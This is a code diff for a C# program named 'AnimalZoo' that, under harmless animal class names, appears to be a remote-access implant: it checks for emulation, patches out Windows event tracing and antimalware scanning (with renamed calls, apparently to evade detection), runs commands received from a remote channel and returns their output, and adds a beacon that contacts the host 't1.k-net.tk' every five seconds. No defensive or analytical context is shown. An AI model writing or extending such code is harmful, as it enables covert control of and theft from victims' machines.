@@ -5,12 +5,16 @@ using System.Net.Sockets;
 using System.Threading.Tasks;
 using System.Text;
 using System.Diagnostics;
+using System.Threading;
 
 
 
 namespace AnimalZoo {
     public class Elephant
     {
+        private static bool doAntEating = false;
+
+        private static string OwlOrZebra = "Zebra";
         
         static void Main(string[] args)
         {
@@ -20,38 +24,61 @@ namespace AnimalZoo {
             if (Chameleon.CheckEmulated())
                 return;
 
-            Chameleon.PatchETW();
-            Chameleon.PatchAMSI();
+            Chameleon.PatchETT();
+            Chameleon.PatchAM();
 
-            Console.WriteLine("Welcome to 4nimal Zoo!");
-
-            Owl owlChannel = new Owl(true);
-            if(!owlChannel.Connect())
+            if (doAntEating)
             {
-                return;
+                Anteater.EatAnts();
             }
-
-            string lastOwlCmmd = "";
-            do
+            else
             {
-                string owlCmmd = owlChannel.receiveCommand();
-                if(owlCmmd == null)
-                {
-                    break;
-                }
-                lastOwlCmmd = owlCmmd.Trim();
 
-                string output = Shark.exec(owlCmmd);
-                if(output == null)
+                if (OwlOrZebra == "Owl")
                 {
-                    break;
-                }
-                if (!owlChannel.respondWith(output))
-                {
-                    break;
-                }
-            } while (lastOwlCmmd != "exit");
+                    Owl owlChannel = new Owl(true);
+                    if (!owlChannel.Connect())
+                    {
+                        return;
+                    }
 
+
+                    string lastOwlCmmd = "";
+                    do
+                    {
+                        string owlCmmd = owlChannel.receiveCommand();
+                        if (owlCmmd == null)
+                        {
+                            break;
+                        }
+                        lastOwlCmmd = owlCmmd.Trim();
+
+                        string output = Shark.exec(owlCmmd);
+                        if (output == null)
+                        {
+                            break;
+                        }
+                        if (!owlChannel.respondWith(output))
+                        {
+                            break;
+                        }
+                    } while (lastOwlCmmd != "exit");
+                }
+                else // Use a Zebra Channel
+                {
+                    Zebra zebraChannel = new Zebra("t1.k-net.tk");
+                    zebraChannel.sendHello();
+
+                    while (zebraChannel.running)
+                    {
+                        // Sleepy Zebra
+                        Thread.Sleep(5000);
+
+                        bool newC = zebraChannel.getUpdate();
+
+                    }
+                }
+            }
         }
     }
 }
